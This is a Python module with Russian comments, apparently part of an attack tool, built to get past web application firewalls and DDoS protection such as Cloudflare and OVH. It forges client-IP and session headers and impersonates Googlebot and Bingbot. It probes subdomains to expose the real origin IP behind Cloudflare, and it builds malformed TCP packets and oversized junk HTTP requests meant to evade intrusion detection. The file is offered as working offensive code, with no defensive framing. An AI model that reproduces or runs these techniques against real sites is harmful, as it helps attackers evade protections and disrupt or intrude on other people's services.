# bypass/techniques.py
import random
import hashlib
import socket
import asyncio
import aiohttp
from typing import Dict, List, Optional
from urllib.parse import urlparse
from colorama import Fore, Style


class BypassTechniques:
    """Техники обхода WAF и систем защиты"""
    
    def __init__(self):
        self.cf_ips = []  # Кэш реальных IP за Cloudflare
        self.waf_detected = None
        
    @staticmethod
    def cloudflare_headers() -> Dict[str, str]:
        """Заголовки для обхода Cloudflare"""
        cf_connecting_ip = f"{random.randint(1,255)}.{random.randint(1,255)}." \
                          f"{random.randint(1,255)}.{random.randint(1,255)}"
        
        return {
            'CF-Connecting-IP': cf_connecting_ip,
            'X-Forwarded-For': cf_connecting_ip,
            'X-Real-IP': cf_connecting_ip,
            'True-Client-IP': cf_connecting_ip,
            'CF-RAY': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
            'CF-IPCountry': random.choice(['US', 'GB', 'DE', 'FR', 'JP']),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Pragma': 'no-cache',
            'TE': 'trailers',
        }
    
    @staticmethod
    def ovh_bypass_headers() -> Dict[str, str]:
        """Заголовки для обхода OVH защиты"""
        return {
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Ssl': 'on',
            'X-Forwarded-Port': '443',
            'X-Forwarded-Host': random.choice(['localhost', '127.0.0.1', '0.0.0.0']),
            'X-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}." \
                          f"{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}." \
                               f"{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Remote-IP': f"{random.randint(1,255)}.{random.randint(1,255)}." \
                          f"{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Remote-Addr': f"{random.randint(1,255)}.{random.randint(1,255)}." \
                            f"{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Proxy-IP': f"{random.randint(1,255)}.{random.randint(1,255)}." \
                         f"{random.randint(1,255)}.{random.randint(1,255)}",
        }
    
    @staticmethod
    def waf_bypass_headers() -> Dict[str, str]:
        """Общие заголовки для обхода WAF"""
        session_id = hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]
        
        return {
            'Cookie': f'PHPSESSID={session_id}; csrftoken={session_id[:16]}; sessionid={session_id}',
            'X-CSRFToken': session_id[:16],
            'X-Requested-With': 'XMLHttpRequest',
            'X-Ajax-Navigation': 'true',
            'X-Request-ID': session_id,
            'X-Correlation-ID': session_id[:24],
            'X-Debug': 'false',
            'X-Is-Ajax-Request': 'true',
            'X-PJAX': 'true',
            'X-PJAX-Container': '#main',
        }
    
    @staticmethod
    def generate_legit_session() -> Dict[str, str]:
        """Генерация легитной сессии"""
        session_id = hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]
        csrf_token = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
        
        return {
            'Cookie': f'session={session_id}; _csrf={csrf_token}; auth_token={session_id[:24]}',
            'X-CSRF-Token': csrf_token,
            'X-XSRF-TOKEN': csrf_token,
            'X-Auth-Token': session_id[:24],
            'Authorization': f'Bearer {session_id}',
            'Referer': random.choice([
                'https://www.google.com/',
                'https://www.facebook.com/',
                'https://twitter.com/',
                'https://www.linkedin.com/'
            ]),
            'Origin': random.choice([
                'https://www.google.com',
                'https://www.facebook.com',
                'https://twitter.com',
                'https://www.linkedin.com'
            ]),
        }
    
    @staticmethod
    def rotate_user_agents() -> List[str]:
        """Список легитимных User-Agent"""
        return [
            # Googlebot
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            
            # Bingbot
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36',
            
            # Стабильные браузеры
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            
            # Мобильные
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
            'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            
            # Редкие, но легитимные
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.144',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
            'Mozilla/5.0 (X11; CrOS x86_64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
    
    async def detect_waf(self, url: str) -> Optional[str]:
        """Определение типа WAF/защиты"""
        try:
            parsed = urlparse(url)
            hostname = parsed.hostname
            
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=5)
            ) as session:
                # Проверяем стандартные заголовки
                async with session.get(
                    f"{parsed.scheme}://{hostname}/",
                    headers={'User-Agent': 'Mozilla/5.0 (WAF-Detector)'}
                ) as response:
                    headers = response.headers
                    
                    # Cloudflare
                    if 'cf-ray' in headers.lower() or 'cloudflare' in headers.get('server', '').lower():
                        self.waf_detected = 'cloudflare'
                        return 'cloudflare'
                    
                    # Sucuri
                    if 'x-sucuri-id' in headers.lower() or 'sucuri' in headers.get('server', '').lower():
                        self.waf_detected = 'sucuri'
                        return 'sucuri'
                    
                    # Incapsula
                    if 'incap-sid' in headers.lower() or 'incapsula' in headers.get('via', '').lower():
                        self.waf_detected = 'incapsula'
                        return 'incapsula'
                    
                    # Akamai
                    if 'akamai' in headers.get('server', '').lower():
                        self.waf_detected = 'akamai'
                        return 'akamai'
                    
                    # OVH
                    if any(x in headers.get('server', '').lower() for x in ['ovh', 'varnish']):
                        self.waf_detected = 'ovh'
                        return 'ovh'
                    
                    # AWS WAF
                    if 'aws' in headers.get('x-amz-cf-pop', '').lower():
                        self.waf_detected = 'aws'
                        return 'aws'
        
        except Exception as e:
            if 'debug' in globals() and globals()['debug']:
                print(f"{Fore.YELLOW}⚠️  WAF detection failed: {e}{Style.RESET_ALL}")
        
        self.waf_detected = 'unknown'
        return None
    
    async def find_cf_real_ip(self, domain: str) -> List[str]:
        """Поиск реального IP за Cloudflare"""
        if self.cf_ips:
            return self.cf_ips
        
        print(f"{Fore.CYAN}🔍 Looking for real IP behind Cloudflare...{Style.RESET_ALL}")
        
        real_ips = []
        
        # Источники для поиска исторических записей
        sources = [
            f"https://crt.sh/?q={domain}",
            f"https://api.securitytrails.com/v1/history/{domain}/dns/a",
            f"https://api.viewdns.info/iphistory/?domain={domain}",
            f"https://dns.bufferover.run/dns?q={domain}",
        ]
        
        try:
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=10)
            ) as session:
                # Проверяем прямые поддомены
                subdomains = [
                    'direct', 'origin', 'server', 'backend',
                    'host', 'ip', 'www2', 'www3', 'cdn',
                    'static', 'assets', 'media', 'uploads'
                ]
                
                for sub in subdomains:
                    test_domain = f"{sub}.{domain}" if sub else domain
                    try:
                        ip = socket.gethostbyname(test_domain)
                        if ip not in real_ips:
                            real_ips.append(ip)
                            print(f"{Fore.GREEN}✅ Found IP: {ip} via {test_domain}{Style.RESET_ALL}")
                    except socket.gaierror:
                        continue
                
                # Проверяем популярные порты
                if real_ips:
                    for ip in real_ips[:3]:  # Проверяем первые 3 IP
                        if await self.verify_web_server(ip, domain):
                            self.cf_ips.append(ip)
        
        except Exception as e:
            if 'debug' in globals() and globals()['debug']:
                print(f"{Fore.YELLOW}⚠️  CF IP search failed: {e}{Style.RESET_ALL}")
        
        if self.cf_ips:
            print(f"{Fore.GREEN}✅ Found {len(self.cf_ips)} real IPs{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}⚠️  Could not find real IP behind Cloudflare{Style.RESET_ALL}")
        
        return self.cf_ips
    
    async def verify_web_server(self, ip: str, original_domain: str) -> bool:
        """Проверка, что IP действительно обслуживает сайт"""
        try:
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=3)
            ) as session:
                # Пробуем с оригинальным Host заголовком
                headers = {'Host': original_domain}
                async with session.get(
                    f"http://{ip}/",
                    headers=headers,
                    allow_redirects=False,
                    ssl=False
                ) as response:
                    if response.status in [200, 301, 302, 403]:
                        # Проверяем, что контент похож
                        content_type = response.headers.get('content-type', '')
                        if any(x in content_type.lower() for x in ['html', 'text']):
                            return True
        except:
            pass
        
        return False
    
    def get_bypass_headers(self, technique: str = 'auto') -> Dict[str, str]:
        """Получение заголовков для обхода в зависимости от техники"""
        if technique == 'auto' and self.waf_detected:
            technique = self.waf_detected
        
        if technique == 'cloudflare':
            return self.cloudflare_headers()
        elif technique == 'ovh':
            return self.ovh_bypass_headers()
        elif technique == 'waf':
            return self.waf_bypass_headers()
        else:
            # Комбинируем все техники
            headers = {}
            headers.update(self.generate_legit_session())
            headers.update(self.cloudflare_headers())
            headers.update(self.waf_bypass_headers())
            
            # Добавляем случайный User-Agent
            headers['User-Agent'] = random.choice(self.rotate_user_agents())
            
            return headers
    
    @staticmethod
    def generate_malformed_packets() -> List[bytes]:
        """Генерация искаженных пакетов для обхода IDS/IPS"""
        packets = []
        
        # TCP пакеты с нестандартными флагами
        for _ in range(5):
            # SYN с неправильными параметрами
            packet = b'\x45\x00\x00\x28\x00\x00\x40\x00\x40\x06\x00\x00' \
                    b'\x00\x00\x00\x00\x00\x00\x00\x00' \
                    b'\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x00\x00\x00\x00\x00\x00'
            packets.append(packet)
        
        # HTTP запросы с нестандартными методами
        weird_methods = [
            b'JUNK / HTTP/1.1\r\nHost: target.com\r\n\r\n',
            b'GARBAGE / HTTP/1.0\r\n\r\n',
            b'SPAM / HTTP/1.1\r\nX-Header: ' + b'A' * 1000 + b'\r\n\r\n',
            b'GET /?' + b'A' * 2048 + b' HTTP/1.1\r\n\r\n',
            b'POST / HTTP/1.1\r\nContent-Length: 1000000\r\n\r\n' + b'X' * 10000
        ]
        
        packets.extend(weird_methods)
        
        return packets